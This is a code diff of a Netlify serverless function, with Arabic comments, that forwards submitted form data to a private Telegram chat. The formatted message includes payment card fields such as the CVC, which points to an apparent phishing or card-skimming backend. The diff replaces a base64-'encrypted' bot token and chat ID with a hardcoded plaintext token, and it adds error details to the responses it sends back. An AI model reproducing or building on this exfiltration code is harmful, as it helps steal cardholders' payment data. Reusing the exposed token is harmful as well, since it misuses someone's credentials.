@@ -1,28 +1,14 @@
 // دالة Netlify محدثة - 10 رسائل لكل جهاز في الدقيقة
-const crypto = require('crypto');
 const axios = require('axios');
 
-// تشفير التوكن والـ ID
-const ENCRYPTED_BOT_TOKEN = 'ODA0MTE5NDA4NDpBQUhVQ1ZiajRRR0YybUM5Y3dvQjQzbElFN05wOVMzRVVIOA==';
-const ENCRYPTED_CHAT_ID = 'NjY0MTkzODM1';
-
-// مفتاح التشفير
-const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'your-secret-key-here';
+// بيانات البوت (بدون تشفير مؤقتاً)
+const BOT_TOKEN = '8041194084:AAHUCVbj4QGF2mC9cwoB43lIE7Np9S3EUH8';
+const CHAT_ID = '664193835';
 
 // نظام Rate Limiting - 10 رسائل لكل جهاز في الدقيقة
 const rateLimitStore = new Map();
 const deviceSessions = new Map();
 const blockedDevices = new Set();
-
-// فك تشفير البيانات
-function decryptData(encryptedData) {
-  try {
-    return Buffer.from(encryptedData, 'base64').toString('utf-8');
-  } catch (error) {
-    console.error('فشل في فك تشفير البيانات:', error);
-    return null;
-  }
-}
 
 // التحقق من Rate Limiting
 function checkRateLimit(deviceFingerprint) {
@@ -103,7 +89,8 @@ exports.handler = async (event, context) => {
   const headers = {
     'Access-Control-Allow-Origin': '*',
     'Access-Control-Allow-Headers': 'Content-Type, X-Device-Fingerprint, X-Session-Key, X-Timestamp, X-Signature',
-    'Access-Control-Allow-Methods': 'POST, GET, OPTIONS'
+    'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
+    'Content-Type': 'application/json'
   };
   
   if (event.httpMethod === 'OPTIONS') {
@@ -111,6 +98,20 @@ exports.handler = async (event, context) => {
   }
   
   try {
+    // معالجة GET request
+    if (event.httpMethod === 'GET') {
+      return {
+        statusCode: 200,
+        headers,
+        body: JSON.stringify({
+          success: true,
+          message: 'API يعمل بنجاح',
+          environment: 'Netlify Functions',
+          rateLimit: '10 رسائل لكل جهاز في الدقيقة'
+        })
+      };
+    }
+    
     const body = JSON.parse(event.body);
     const { data, deviceFingerprint, sessionKey, signature, timestamp } = body;
     
@@ -124,21 +125,6 @@ exports.handler = async (event, context) => {
           error: validation.reason,
           code: 'RATE_LIMIT_EXCEEDED',
           remainingTime: validation.remainingTime || 0
-        })
-      };
-    }
-    
-    // فك تشفير التوكن والـ ID
-    const botToken = decryptData(ENCRYPTED_BOT_TOKEN);
-    const chatId = decryptData(ENCRYPTED_CHAT_ID);
-    
-    if (!botToken || !chatId) {
-      return {
-        statusCode: 500,
-        headers,
-        body: JSON.stringify({
-          error: 'خطأ في إعدادات البوت',
-          code: 'BOT_CONFIG_ERROR'
         })
       };
     }
@@ -190,9 +176,9 @@ ${data.message.cvc ? `🔐 CVC: ${data.message.cvc}` : ''}
     
     // إرسال الرسالة إلى تليجرام
     const telegramResponse = await axios.post(
-      `https://api.telegram.org/bot${botToken}/sendMessage`,
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
       {
-        chat_id: chatId,
+        chat_id: CHAT_ID,
         text: formattedMessage,
         parse_mode: 'HTML'
       },
@@ -235,7 +221,8 @@ ${data.message.cvc ? `🔐 CVC: ${data.message.cvc}` : ''}
       headers,
       body: JSON.stringify({
         error: 'خطأ داخلي في الخادم',
-        code: 'INTERNAL_ERROR'
+        code: 'INTERNAL_ERROR',
+        details: error.message
       })
     };
   }
